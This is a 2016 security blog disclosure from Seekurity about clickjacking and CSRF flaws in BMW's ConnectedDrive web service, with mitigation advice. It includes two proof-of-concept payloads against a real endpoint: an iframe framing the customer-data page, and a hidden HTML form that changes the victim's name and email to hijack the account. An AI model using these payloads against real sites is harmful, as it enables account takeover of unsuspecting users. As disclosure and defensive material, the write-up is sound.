---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2016-07-24_bmw-vulnerabilities-hijack-cars-connecteddrive-service.md
original_filename: 2016-07-24_bmw-vulnerabilities-hijack-cars-connecteddrive-service.md
title: BMW Vulnerabilities – Hijack Cars ConnectedDrive™ Service!
category: documents
detected_topics:
- clickjacking
- csrf
- command-injection
- mfa
- automation-abuse
- api-security
tags:
- imported
- documents
- clickjacking
- csrf
- command-injection
- mfa
- automation-abuse
- api-security
language: en
raw_sha256: ba22361630f6d0f58fd9eb85e48bc66d299462584495d96c28b935ca73b54324
text_sha256: 6392134a879f2851bec7bc794ba082d77e04286de0ce2f8cb4e8094e9e32f047
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# BMW Vulnerabilities – Hijack Cars ConnectedDrive™ Service!

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2016-07-24_bmw-vulnerabilities-hijack-cars-connecteddrive-service.md
- Source Type: markdown
- Detected Topics: clickjacking, csrf, command-injection, mfa, automation-abuse, api-security
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `ba22361630f6d0f58fd9eb85e48bc66d299462584495d96c28b935ca73b54324`
- Text SHA256: `6392134a879f2851bec7bc794ba082d77e04286de0ce2f8cb4e8094e9e32f047`


## Content

---
title: "BMW Vulnerabilities – Hijack Cars ConnectedDrive™ Service!"
page_title: "BMW Vulnerabilities – Hijack Cars ConnectedDrive™ Service! – Seekurity"
url: "https://www.seekurity.com/blog/general/bmw-vulnerabilities-hijack-cars-connecteddrive-service/"
final_url: "https://seekurity.com/blog/2016/07/24/admin/general/bmw-vulnerabilities-hijack-cars-connecteddrive-service"
authors: ["Mohamed A. Baset"]
programs: ["BMW"]
bugs: ["Clickjacking", "CSRF"]
publication_date: "2016-07-24"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6275
---

Hi Folks,  
Let me tell you the story about some typical vulnerabilities that was discovered by [@Seekurity](https://twitter.com/Seekurity) Team in BMW ConnectedDrive service which will allow any beginner attacker to hijack the whole service!

.

**First what is BMW ConnectedDrive service?**  
BMW ConnectedDrive – a technology packet full of services and apps that connects you closely to the world around you. It makes tasks easier and quicker to perform, giving you more time for what’s really important: your family, friends and free time.

A screenshot from BMW ConnectedDrive page shows some capabilities about the service:

![Screen Shot 2016-07-23 at 11.39.21 PM](https://seekurity.com/blog/wp-content/uploads/2016/07/Screen-Shot-2016-07-23-at-11.39.21-PM.png)

.  
Also here’s a video demonstrate the service nature and how it works:

.

Regarding the discovered vulnerabilities:  
No web application is immune against at least a one or two typical vulnerability, The vulnerabilities we have discovered are able to give the attackers the ability to hijack the service, Change credentials, and many more!  
.

.  
We discovered that BMW ConnectedDrive web application is vulnerable to both [ClickJacking](https://www.owasp.org/index.php/clickjacking) and [Cross Site Request Forgery](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_\(CSRF\)) attacks!

**1\. ClickJacking**

Clickjacking, also known as a “UI redress attack”, is when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another page when they were intending to click on the the top level page. Thus, the attacker is “hijacking” clicks meant for their page and routing them to another page, most likely owned by another application, domain, or both.

Using a similar technique, keystrokes can also be hijacked. With a carefully crafted combination of stylesheets, iframes, and text boxes, a user can be led to believe they are typing in the password to their email or bank account, but are instead typing into an invisible frame controlled by the attacker.

.

**More Details About clickjacking:**  
Because of no frame busting techniques or X-Frame-Options header, the whole website is vulnerable to Clickjacking attacks which could lead to a full account takeover considering such scenario:  
1\. Attacker will iframe any sensitive the website page and adjust the iframe size and add a “divs” as a layers on the unwanted-to-show parts of the original web page to fool and trick the user.  
2\. User get tricked by the crafted page and followed the attacker’s instruction to do a specific clicks to the iframed page  
3\. Unwanted actions happened in the logged in user’s session in result to the attack’s clicks.

.

**PoC Code:**

> BMW ConnectedDrive ClickJacking Issue to Takeover the service!<br>
> 
> <iframe src=”[https://connecteddrive.bmwusa.com/cdp/release/internet/servlet/customerData](https://connecteddrive.bmwusa.com/cdp/release/internet/servlet/login?locale=en_GB)” width=500 height=500></iframe></br>

.

**Mitigation:**

1- Add an X-Frame-Options HTTP Header and set it’s value to “Deny” or “Sameorigin” as you can see it suitable to mitigate such attacks.  
2- Use iframe busting techniques.

.

.

**2\. Cross Site Request Forgery (CSRF)**

Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they’re currently authenticated. CSRF attacks specifically target state-changing requests, not theft of data, since the attacker has no way to see the response to the forged request. With a little help of social engineering (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker’s choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.

..

**PoC Code:**

> <html>  
>  <title>BMW ConnectedDrive CSRF Vulnerability</title>  
>  <h2>BMW ConnectedDrive CSRF Vulnerability – Hijack users cars ConnectedDrive service by @Seekurity!</h2>  
>  </br>  
>  <body>  
>  <form action=”[https://connecteddrive.bmwusa.com/cdp/release/internet/servlet/customerData”](https://connecteddrive.bmwusa.com/cdp/release/internet/servlet/login?locale=en_GB) method=”POST”>  
>  <input type=”hidden” name=”action” value=”changeUsername” />  
>  <input type=”hidden” name=”greeting” value=”MR” />  
>  <input type=”hidden” name=”firstname” value=”Hijacked” />  
>  <input type=”hidden” name=”lastname” value=”Car” />  
>  <input type=”hidden” name=”firstname1″ value=”Hijacked” />  
>  <input type=”hidden” name=”lastname1″ value=”Car” />  
>  <input type=”hidden” name=”firstname2″ value=”” />  
>  <input type=”hidden” name=”lastname2″ value=”” />  
>  <input type=”hidden” name=”middlename” value=”” />  
>  <input type=”hidden” name=”genderRadio” value=”MR” />  
>  <input type=”hidden” name=”nationalitySupport” value=”Standard” />  
>  <input type=”hidden” name=”notification” value=”” />  
>  <input type=”hidden” name=”languageinternet” value=”” />  
>  <input type=”hidden” name=”accountType” value=”UNDEFINED” />  
>  <input type=”hidden” name=”newmail1″ value= “[[email protected]](/cdn-cgi/l/email-protection)” />  
>  <input type=”hidden” name=”newmail2″ value= “[[email protected]](/cdn-cgi/l/email-protection)” />  
>  <input type=”submit” value=”Hijack Me!” />  
>  </form>  
>  </body>  
>  </html>

..

**Mitigation:**  
1- Adding an Anti-CSRF random value along with the sent requests will properly mitigate the issue.  
.

.

**Vulnerabilities Proof of Concept Video:**

.

.

.

**Hey!**  
Building a website? Or already built a one? Think twice before going public and let us [protect your business](https://www.seekurity.com/#pricing)!

[](https://www.addtoany.com/add_to/facebook?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2016%2F07%2F24%2Fadmin%2Fgeneral%2Fbmw-vulnerabilities-hijack-cars-connecteddrive-service&linkname=BMW%20Vulnerabilities%20%E2%80%93%20Hijack%20Cars%20ConnectedDrive%E2%84%A2%20Service%21 "Facebook")[](https://www.addtoany.com/add_to/pinterest?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2016%2F07%2F24%2Fadmin%2Fgeneral%2Fbmw-vulnerabilities-hijack-cars-connecteddrive-service&linkname=BMW%20Vulnerabilities%20%E2%80%93%20Hijack%20Cars%20ConnectedDrive%E2%84%A2%20Service%21 "Pinterest")[](https://www.addtoany.com/add_to/twitter?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2016%2F07%2F24%2Fadmin%2Fgeneral%2Fbmw-vulnerabilities-hijack-cars-connecteddrive-service&linkname=BMW%20Vulnerabilities%20%E2%80%93%20Hijack%20Cars%20ConnectedDrive%E2%84%A2%20Service%21 "Twitter")[](https://www.addtoany.com/add_to/whatsapp?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2016%2F07%2F24%2Fadmin%2Fgeneral%2Fbmw-vulnerabilities-hijack-cars-connecteddrive-service&linkname=BMW%20Vulnerabilities%20%E2%80%93%20Hijack%20Cars%20ConnectedDrive%E2%84%A2%20Service%21 "WhatsApp")[](https://www.addtoany.com/add_to/telegram?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2016%2F07%2F24%2Fadmin%2Fgeneral%2Fbmw-vulnerabilities-hijack-cars-connecteddrive-service&linkname=BMW%20Vulnerabilities%20%E2%80%93%20Hijack%20Cars%20ConnectedDrive%E2%84%A2%20Service%21 "Telegram")[](https://www.addtoany.com/add_to/linkedin?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2016%2F07%2F24%2Fadmin%2Fgeneral%2Fbmw-vulnerabilities-hijack-cars-connecteddrive-service&linkname=BMW%20Vulnerabilities%20%E2%80%93%20Hijack%20Cars%20ConnectedDrive%E2%84%A2%20Service%21 "LinkedIn")[](https://www.addtoany.com/add_to/google_gmail?linkurl=https%3A%2F%2Fseekurity.com%2Fblog%2F2016%2F07%2F24%2Fadmin%2Fgeneral%2Fbmw-vulnerabilities-hijack-cars-connecteddrive-service&linkname=BMW%20Vulnerabilities%20%E2%80%93%20Hijack%20Cars%20ConnectedDrive%E2%84%A2%20Service%21 "Gmail")[](https://www.addtoany.com/share)

BMW  Cars  ConnectedDrive  Hijack  Service  Vulnerabilities
